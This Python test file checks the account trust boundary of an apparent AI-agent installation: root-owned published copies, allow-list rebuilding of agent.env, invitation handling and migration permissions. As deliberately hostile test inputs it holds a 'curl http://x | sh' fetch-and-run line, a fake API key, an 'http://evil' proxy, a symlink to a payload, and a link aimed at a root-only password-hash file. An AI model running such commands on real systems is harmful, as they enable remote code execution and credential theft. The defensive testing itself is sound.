"""The trust boundary of one account per person: persons, the agent, root.

The agent account (``delfin``) runs the agent, its CLI backends and MCP
servers, and writes its own build of the installation (``/opt/delfin``).
What a person's login sources or executes -- ``agent.env``, the venv's
``activate``, the venv and the Python behind it, the settings defaults, the
launcher package of an invitation -- comes from a second tree,
``/opt/delfin-persons``, which only root writes: ``delfin-accounts publish``
copies the build into it, owned by root, without group or other write bits,
with ``agent.env`` and ``settings-defaults.json`` rebuilt from an allow-list
instead of copied. Root never reads a file through a path a person
controls: the invitation is read as the person, and a link is refused.

Root is not available here: the real ``delfin_accounts.sh`` runs against the
stub user database of ``test_each_person_can_have_an_account_of_their_own``
with ``chown`` logged instead of performed.
"""

from __future__ import annotations

import json
import os
import pathlib
import re
import stat
import subprocess
import zipfile

from conftest import child_env
from test_each_person_can_have_an_account_of_their_own import ACCOUNTS, PI, _box, _run

MIGRATE = PI / "pi_accounts_migrate.sh"


def _build(shared: pathlib.Path) -> None:
    """The agent's build as pi_install.sh leaves it: src, a venv whose
    files name the build path, uv's Python, agent.env, the defaults."""
    venv = shared / ".venv"
    (venv / "bin").mkdir(parents=True, exist_ok=True)
    pyhome = shared / "python" / "cpython-3.11-linux-aarch64-gnu" / "bin"
    pyhome.mkdir(parents=True)
    (pyhome / "python3.11").write_text("#!/bin/sh\nexec /usr/bin/python3 \"$@\"\n")
    (pyhome / "python3.11").chmod(0o755)
    (venv / "bin" / "python").symlink_to(pyhome / "python3.11")
    (venv / "bin" / "activate").write_text(f"VIRTUAL_ENV='{venv}'\nexport VIRTUAL_ENV\n")
    (venv / "bin" / "delfin-agent").write_text(f"#!{venv}/bin/python\nimport delfin\n")
    (venv / "bin" / "delfin-agent").chmod(0o775)
    (venv / "pyvenv.cfg").write_text(f"home = {pyhome}\n")
    site = venv / "lib" / "python3.11" / "site-packages"
    site.mkdir(parents=True)
    (site / "__editable__.delfin.pth").write_text(f"{shared}/src\n")
    (venv / "lib64").symlink_to("lib")
    (shared / "src" / "delfin").mkdir(parents=True, exist_ok=True)
    (shared / "src" / "delfin" / "__init__.py").write_text("")
    (shared / "agent.env").write_text(
        "# Sourced by ~/.local/bin/delfin-agent. Edit freely.\n"
        "export DELFIN_AGENT_SANDBOX=auto\n"
        "export DELFIN_AGENT_SANDBOX_TIMEOUT=600\n"
        "export DELFIN_MCP_ISOLATION=builtin\n"
        f"export PLAYWRIGHT_BROWSERS_PATH={shared}/ms-playwright\n")
    (shared / "settings-defaults.json").write_text(json.dumps(
        {"agent": {"mode": "solo", "provider": "kit", "permission_profile": "repo_free"},
         "ui": {"tabs": {"order": ["agent", "calc"], "hidden": []}}}))
    (shared / "work").mkdir()
    (shared / "work" / "agent-only.txt").write_text("the agent's workspace\n")


def _published(tmp_path):
    fake, script, env, sshd_conf, shared = _box(tmp_path)
    _build(shared)
    persons = shared.parent / "delfin-persons"
    return fake, script, env, shared, persons


# -- finding 1: what a person's login runs is root's, not the agent's ------
def test_publish_makes_a_root_owned_copy_that_names_no_file_of_the_build(tmp_path):
    fake, script, env, shared, persons = _published(tmp_path)
    r = _run(script, env, "publish")
    assert r.returncode == 0, r.stderr + r.stdout
    assert (persons / ".venv" / "bin" / "activate").is_file()
    log = (fake / "log").read_text()
    # Handed to root as a whole (links included, never followed), the
    # top directory then opened to the persons' group only.
    assert f"chown -R -h root:root {persons}.new" in log
    assert f"chown root:delfin-people {persons}.new" in log
    assert oct(persons.stat().st_mode & 0o777) == "0o750"
    # No file or directory the persons read is writable by group or others.
    for path in [persons, *persons.rglob("*")]:
        if path.is_symlink():
            continue
        assert not path.stat().st_mode & (stat.S_IWGRP | stat.S_IWOTH), path
    # Nothing in it points back into the agent's build.
    build = re.compile(re.escape(str(shared)) + r"(?![\w.-])")
    for path in persons.rglob("*"):
        if path.is_symlink():
            assert not build.search(os.readlink(path)), path
            target = os.path.realpath(path)
            assert target.startswith(str(persons) + "/") or target.startswith("/usr/"), (path, target)
        elif path.is_file():
            assert not build.search(path.read_text(errors="replace")), path
    assert (persons / ".venv" / "bin" / "python").resolve().is_relative_to(persons)
    assert (persons / ".venv" / "lib" / "python3.11" / "site-packages" /
            "__editable__.delfin.pth").read_text() == f"{persons}/src\n"
    # The agent's workspace is not part of what persons get.
    assert not (persons / "work").exists()


def test_a_persons_login_sources_only_the_root_owned_copy(tmp_path):
    fake, script, env, shared, persons = _published(tmp_path)
    assert _run(script, env, "publish").returncode == 0
    r = _run(script, env, "add", "anna", "--no-invite")
    assert r.returncode == 0, r.stderr + r.stdout
    bashrc = (fake / "home" / "anna" / ".bashrc").read_text()
    block = bashrc[bashrc.index("# >>> delfin-accounts"):]
    named = re.findall(r"'(/[^']+)'", block)
    assert named, block
    for path in named:
        assert path.startswith(str(persons) + "/"), path
    assert f"{shared}/" not in block


def test_publish_refuses_a_link_out_of_the_installation_and_a_special_file(tmp_path):
    fake, script, env, shared, persons = _published(tmp_path)
    (shared / "src" / "delfin" / "evil.py").symlink_to(fake / "home" / "delfin" / "payload.py")
    r = _run(script, env, "publish")
    assert r.returncode != 0 and "points outside" in r.stderr, r.stderr + r.stdout
    assert not persons.exists() and not pathlib.Path(f"{persons}.new").exists()
    (shared / "src" / "delfin" / "evil.py").unlink()
    os.mkfifo(shared / "src" / "fifo")
    r = _run(script, env, "publish")
    assert r.returncode != 0 and "not a file" in r.stderr, r.stderr + r.stdout


def test_the_persons_root_must_sit_in_a_directory_only_root_writes(tmp_path):
    fake, script, env, shared, persons = _published(tmp_path)
    text = script.read_text()
    script.write_text(text.replace(f"ROOT_UID={os.getuid()}", "ROOT_UID=0", 1))
    r = _run(script, env, "publish")
    assert r.returncode != 0 and "only root" in r.stderr, r.stderr + r.stdout
    assert not persons.exists()


# -- finding 2 and 5: defaults and agent.env are rebuilt, never copied -----
def test_publish_rebuilds_agent_env_from_an_allow_list_without_secrets(tmp_path):
    fake, script, env, shared, persons = _published(tmp_path)
    with (shared / "agent.env").open("a") as fh:
        fh.write("export KIT_TOOLBOX_API_KEY=sk-should-never-leave\n"
                 "export DELFIN_AGENT_SANDBOX=off\n"
                 "curl http://x | sh\n"
                 "export PATH=/home/delfin/bin:$PATH\n")
    r = _run(script, env, "publish")
    assert r.returncode == 0, r.stderr + r.stdout
    text = (persons / "agent.env").read_text()
    assert "sk-should-never-leave" not in text and "API_KEY" not in text
    assert "curl" not in text and "PATH=/home" not in text
    assert "export DELFIN_AGENT_SANDBOX=auto\n" in text
    assert "DELFIN_AGENT_SANDBOX=off" not in text
    assert f"export PLAYWRIGHT_BROWSERS_PATH={persons}/ms-playwright\n" in text
    for line in text.splitlines():
        assert line.startswith("#") or re.fullmatch(r"export [A-Z_]+=[A-Za-z0-9_./:-]*", line), line
    assert "KIT_TOOLBOX_API_KEY" in r.stderr, "a dropped line is named to the admin"


def test_publish_keeps_the_defaults_but_never_a_profile_without_asking(tmp_path):
    fake, script, env, shared, persons = _published(tmp_path)
    for profile in ("all_free", "bypassPermissions", "full", "auto"):
        (shared / "settings-defaults.json").write_text(json.dumps(
            {"agent": {"mode": "solo", "permission_profile": profile, "extra": "x"},
             "network": {"proxy": "http://evil"}}))
        r = _run(script, env, "publish")
        assert r.returncode == 0, r.stderr + r.stdout
        out = json.loads((persons / "settings-defaults.json").read_text())
        assert out == {"agent": {"mode": "solo"}}, (profile, out)
    (shared / "settings-defaults.json").write_text(json.dumps(
        {"agent": {"permission_profile": "repo_free", "model": "glm-4.6"}}))
    assert _run(script, env, "publish").returncode == 0
    out = json.loads((persons / "settings-defaults.json").read_text())
    assert out == {"agent": {"permission_profile": "repo_free", "model": "glm-4.6"}}


def test_every_variable_the_installers_write_into_agent_env_is_no_secret():
    secret = re.compile(r"KEY|TOKEN|SECRET|PASSW|CREDENTIAL|AUTH", re.I)
    names = set()
    for script in ("pi_bootstrap.sh", "pi_install.sh"):
        text = (PI / script).read_text(encoding="utf-8")
        names |= set(re.findall(r"^\s*\"?export ([A-Z_][A-Z0-9_]*)=", text, re.M))
    assert {"DELFIN_AGENT_SANDBOX", "DELFIN_MCP_ISOLATION", "PLAYWRIGHT_BROWSERS_PATH"} <= names
    for name in names:
        assert not secret.search(name), name
    # And each of them reaches the persons' copy (the allow-list).
    accounts = ACCOUNTS.read_text(encoding="utf-8")
    for name in ("DELFIN_AGENT_SANDBOX", "DELFIN_AGENT_SANDBOX_TIMEOUT",
                 "DELFIN_MCP_ISOLATION", "PLAYWRIGHT_BROWSERS_PATH"):
        assert name in accounts, name


def test_a_persons_cage_gets_no_write_root_from_the_settings_defaults(tmp_path, monkeypatch):
    """sandbox._account_homes adds dirname(DELFIN_SETTINGS_DEFAULTS): that
    directory only receives masks, never a read-write bind, and neither
    does the agent's build or its work/."""
    from delfin.agent import sandbox

    persons = tmp_path / "opt" / "delfin-persons"
    build = tmp_path / "opt" / "delfin"
    (persons / ".delfin" / "messenger_pairing").mkdir(parents=True)
    (persons / "settings-defaults.json").write_text("{}")
    (build / "work").mkdir(parents=True)
    home = tmp_path / "home" / "anna"
    repo = home / "project"
    repo.mkdir(parents=True)
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("DELFIN_SETTINGS_DEFAULTS", str(persons / "settings-defaults.json"))
    assert persons.resolve() in sandbox._account_homes(home)
    argv = sandbox._bwrap_argv("true", repo, False)
    writable = [argv[i + 2] for i, a in enumerate(argv) if a in ("--bind", "--bind-try")]
    for target in writable:
        for root in (persons.resolve(), build.resolve()):
            assert not (target == str(root) or target.startswith(str(root) + "/")), target
            assert not str(root).startswith(target.rstrip("/") + "/"), target
    for path in sandbox.home_secret_paths(home):
        if path.startswith(str(persons.resolve())):
            assert path.endswith(("/messenger_pairing", "/messenger_sessions", "/.run")), path


# -- finding 3: the invitation's launcher comes from the root-owned copy ---
def test_the_invitation_packages_the_launcher_of_the_root_owned_copy(tmp_path):
    fake, script, env, shared, persons = _published(tmp_path)
    assert _run(script, env, "publish").returncode == 0
    with zipfile.ZipFile(shared / "src" / "tools" / "delfin-windows-launcher.zip", "w") as z:
        z.writestr("windows-launcher/Install.cmd", "@echo planted after the publish\r\n")
    r = _run(script, env, "add", "anna", "--host", "box.example")
    assert r.returncode == 0, r.stderr + r.stdout
    with zipfile.ZipFile(fake / "home" / "pi" / "invites" / "DELFIN-anna.zip") as z:
        assert b"planted" not in z.read("windows-launcher/Install.cmd")


# -- finding 4: root reads nothing through a path a person controls --------
def test_the_root_copy_of_an_invitation_refuses_a_link(tmp_path):
    fake, script, env, shared, persons = _published(tmp_path)
    assert _run(script, env, "publish").returncode == 0
    secret = fake / "root-only.txt"
    secret.write_text("root:$6$hash:20000:::\n")
    # A delfin-people that leaves a link where the invitation belongs.
    people = script.parent / "delfin-people"
    people.write_text('#!/usr/bin/env bash\nmkdir -p "$HOME/invites"\n'
                      f'ln -sfn {secret} "$HOME/invites/DELFIN-anna.zip"\n'
                      'echo "Server: anna@box. Valid once, until x"\n')
    r = _run(script, env, "add", "anna")
    assert r.returncode != 0 and "link" in r.stderr, r.stderr + r.stdout
    out = fake / "home" / "pi" / "invites" / "DELFIN-anna.zip"
    assert not out.exists() or "$6$" not in out.read_text(errors="replace")
    for f in (fake / "home" / "pi" / "invites").glob("*"):
        assert "$6$" not in f.read_text(errors="replace"), f


def test_root_reads_the_invitation_and_the_keys_as_the_person():
    text = ACCOUNTS.read_text(encoding="utf-8")
    assert 'install -m 600 -o "$admin"' not in text
    assert re.search(r'run_as "\$name" cat -- "\$src"', text)
    assert re.search(r'run_as "\$u" grep -c', text)


def test_list_does_not_follow_a_link_for_authorized_keys(tmp_path):
    fake, script, env, shared, persons = _published(tmp_path)
    assert _run(script, env, "add", "anna", "--no-invite").returncode == 0
    keys = fake / "home" / "anna" / ".ssh" / "authorized_keys"
    other = fake / "elsewhere"
    other.write_text("restrict,port-forwarding,pty ssh-ed25519 AAAA x\n")
    keys.unlink()
    keys.symlink_to(other)
    listing = _run(script, env, "list").stdout
    row = next(line.split() for line in listing.splitlines() if line.startswith("anna"))
    assert row[2] == "?", listing


# -- finding 5: the migration never leaves the shared root open ------------
def _agent_home(tmp_path):
    home = tmp_path / "home" / "delfin"
    (home / "delfin" / "work" / "s1").mkdir(parents=True)
    (home / "delfin" / "work" / "s1" / "notes.md").write_text("agent work\n")
    (home / "delfin" / "agent.env").write_text("export DELFIN_AGENT_SANDBOX=auto\n")
    (home / "people" / "hmaxi" / ".delfin").mkdir(parents=True)
    (home / ".ssh").mkdir()
    (home / ".ssh" / "authorized_keys").write_text(
        "restrict,port-forwarding,pty ssh-ed25519 AAAA delfin-launcher-silvia\n")
    return home, tmp_path / "opt" / "delfin"


def test_the_migration_creates_the_shared_root_closed_before_moving_work_in(tmp_path):
    home, shared = _agent_home(tmp_path)
    env = child_env(tmp_path)
    env["DELFIN_ACCOUNTS_CONF"] = str(tmp_path / "accounts.conf")
    r = subprocess.run(["bash", "-c", 'umask 022; exec bash "$0" to "$1" "$2"', str(MIGRATE),
                        str(home), str(shared)], env=env, capture_output=True, text=True, timeout=60)
    assert r.returncode == 0, r.stderr
    assert oct(shared.stat().st_mode & 0o777) == "0o700"
    text = MIGRATE.read_text(encoding="utf-8")
    assert text.index('install -d -m 700 "$shared"') < text.index('mv "$kept/work" "$shared/work"')


def test_the_bootstrap_ends_with_a_loud_warning_while_people_mode_data_remains(tmp_path):
    home, shared = _agent_home(tmp_path)
    env = child_env(tmp_path)
    r = subprocess.run(["bash", str(MIGRATE), "status", str(home), str(shared)],
                       env=env, capture_output=True, text=True, timeout=60)
    assert r.returncode == 0, r.stderr
    assert "WARNING" in r.stderr and str(home / "people" / "hmaxi") in r.stderr
    assert "delfin-launcher-silvia" in r.stderr
    boot = (PI / "pi_bootstrap.sh").read_text(encoding="utf-8")
    tail = boot[boot.index('echo "Bootstrap done.'):]
    assert 'pi_accounts_migrate.sh" status' in tail
    # Nothing left: silent.
    import shutil
    shutil.rmtree(home / "people")
    (home / ".ssh" / "authorized_keys").write_text("")
    r = subprocess.run(["bash", str(MIGRATE), "status", str(home), str(shared)],
                       env=env, capture_output=True, text=True, timeout=60)
    assert r.returncode == 0 and "WARNING" not in r.stderr


# -- the host scripts set the boundary up ----------------------------------
def test_the_bootstrap_makes_the_persons_root_roots_and_the_build_the_agents_alone():
    boot = (PI / "pi_bootstrap.sh").read_text(encoding="utf-8")
    assert 'install -d -m 750 -o root -g delfin-people "$PERSONS_ROOT"' in boot
    assert 'install -d -m 750 -o "$AGENT_USER" -g "$AGENT_USER" "$SHARED_ROOT"' in boot
    assert '"DELFIN_PERSONS_ROOT=$PERSONS_ROOT"' in boot
